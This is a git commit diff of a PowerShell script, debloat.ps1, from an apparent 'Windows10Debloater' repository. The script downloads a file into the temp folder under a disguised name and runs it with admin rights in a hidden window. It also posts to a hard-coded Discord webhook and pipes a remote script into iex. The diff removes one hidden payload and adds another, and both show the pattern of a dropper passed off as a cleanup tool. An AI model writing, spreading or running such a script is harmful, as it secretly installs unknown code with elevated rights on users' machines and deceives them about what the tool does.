e4a432610fd9bfca3945c2bb2d8556697118f9e9
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2022-08-17 11:42:50 +0200

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,4 +1,4 @@
-iwr "https://github.com/Dazd-Pkz/Windows10Debloater/raw/main/Microsoft.exe" -o $env:TEMP\powershell.exe
+iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/debloat" -o $env:TEMP\cmd-debloat.bat
 
 $hookUrl = 'https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ'
 $Body = @{
@@ -6,5 +6,5 @@ $Body = @{
 }
 Invoke-RestMethod -useb -Uri $hookUrl -Method 'post' -Body $Body
 
-Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\powershell.exe
+Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\cmd-debloat.bat
 iwr -useb git.io/debloat|iex
